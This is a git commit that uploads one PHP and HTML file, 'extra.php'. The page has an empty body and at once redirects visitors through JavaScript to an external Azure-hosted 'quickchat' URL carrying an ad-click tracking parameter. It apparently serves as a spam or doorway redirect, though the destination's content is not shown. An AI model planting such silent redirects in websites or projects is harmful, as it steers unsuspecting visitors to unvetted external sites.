a366e4809e0a264424d3a50eef8bb6865a381f72
ikukorokuta <ikuko.rokuta@gmail.com>
2026-04-24 11:45:28 +0530

    Add files via upload

---
+++ extra/extra.php
@@ -0,0 +1,18 @@
+<?php
+// You can set your redirect URL here
+$url = "https://quickchat-ayederbpbha5bvfn.z03.azurefd.net/index.php?gclid=Cj0KCQiA8KTNBhD_ARIsAOvp6DJQHfxNge0m2rgRcqFzpUd0uXDnQ4oe1dRfvzRz7WVzaWH6mcPb_3hAaAjsYEALw_746h";
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <title>extra...</title>
+    <script>
+        // Redirect using JS
+        window.location.replace("<?php echo $url; ?>");
+    </script>
+</head>
+<body>
+
+</body>
+</html>
